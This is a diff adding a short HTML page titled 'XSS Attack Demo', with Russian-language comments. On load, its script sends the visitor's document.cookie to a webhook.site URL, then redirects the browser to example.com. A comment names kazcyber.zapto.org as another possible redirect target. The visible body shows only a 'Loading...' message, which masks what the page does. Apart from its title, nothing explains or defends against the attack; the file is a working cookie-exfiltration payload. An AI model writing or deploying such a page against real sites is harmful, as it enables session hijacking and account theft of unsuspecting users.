@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>XSS Attack Demo</title>
+    <script>
+      // Отправка cookie на Webhook
+      fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + document.cookie)
+        .then(() => {
+          // Перенаправление на любой сайт (можно на kazcyber.zapto.org)
+          window.location.href = "https://example.com";
+        });
+    </script>
+  </head>
+  <body>
+    <h1>Загрузка...</h1>
+  </body>
+</html>
